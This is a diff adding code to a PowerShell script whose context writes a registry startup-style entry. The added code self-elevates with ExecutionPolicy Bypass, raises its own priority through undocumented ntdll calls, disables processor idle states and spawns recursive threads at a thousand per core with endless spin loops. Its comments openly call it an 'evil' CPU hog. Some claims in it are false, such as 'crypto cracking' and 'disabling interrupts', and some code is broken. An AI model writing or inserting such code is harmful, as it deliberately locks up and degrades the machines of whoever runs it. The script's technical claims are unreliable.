@@ -51,4 +51,70 @@ $rootMonScript = "C:\YourPath\root_mon.ps1"
 # Use reg add to add the property
 Invoke-Expression "reg add `"$basePath`" /v `"$propertyName`" /t REG_SZ /d `"$rootMonScript`" /f"
 
+
+
+
+if (-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
+    Start-Process powerShell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
+    exit
+}
+
+#+Hijack+the+scheduler+using+undocumented+NTAPI+calls+(because+we're+evil+engineers)++
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+public class NtAPI{
+    [DllImport("ntdll.dll")]
+    public static extern uint NtSetInformationProcess(IntPtr hProcess, int ProcessInformationClass, ref uint ProcessInformation, int ProcessInformationLength);
+}
+'@
+
+#+Enable+PROCESS_BASE_PRIORITY_ABOVE_NORMAL++(0x12)+-+fuck+the+scheduler's+limits++
+$priorityBoost=0x12
+[NtAPI]::NtSetInformationProcess([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x1D, [ref]$priorityBoost,4)
+
+#+Bind+ALL+cores+and+disable+processor+idle+states++
+$MainProcess=Get-Process -Id $pid
+$MainProcess.ProcessorAffinity=0xFFFF
+powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR IDLESTATE 0 #No rest for the wicked
+
+#+Spawn+nested+threads+with+THREAD_PRIORITY_TIME_CRITICAL+(highest+possible)++
+function Invoke-KernelAnnihilator{
+param($Depth)
+[System.Threading.Thread]::CurrentThread.Priority='Highest'
+while($true){
+#+Layer+1:+Brute-force+elliptic+curve+crypto+cracking
+$curve=[System.Security.Cryptography.ECDsa]::Create()
+1..1000000|%{$curve.SignData([BitConverter]::GetBytes($_))|Out-Null}
+#+Layer+2:+Real-time+ray+tracing+without+GPU++
+1..1000000|%{
+$ray=New-Object System.Numerics.Vector3($_%1000,$_%500,$_%200)
+$intersection=[System.Numerics.Vector3]::Reflect($ray,[System.Numerics.Vector3]::UnitX)
+}
+#+Layer+3:+Spawn+sub-threads+with+inherited+priority++
+if($Depth -lt 50){
+Start-ThreadJob -ScriptBlock{
+    param($D) 
+    Invoke-KernelAnnihilator -Depth ($D+1)
+} -ArgumentList+$Depth
+}
+}
+}
+
+#+Overcommit+threads+at+a+1000:1+ratio+to+logical+cores++
+1..([System.Environment]::ProcessorCount*1000)|%{
+Start-ThreadJob -ScriptBlock {Invoke-KernelAnnihilator -Depth 1}
+}
+
+#+Disable+interrupts+by+flooding+the+CPU+with+spinlocks++
+while($true){
+[System.Threading.SpinWait]::SpinUntil({$false},[TimeSpan]::MaxValue)
+}
+
+1..10000000 | % {
+[math]::Sin([math]::PI * $_) + [math]::Sqrt($_)
+# No Sleep(), no mercy—pure thread-lock
+} 
+
+# Last CPU_HOG Script on `mem_hog mod` commit
 ### END
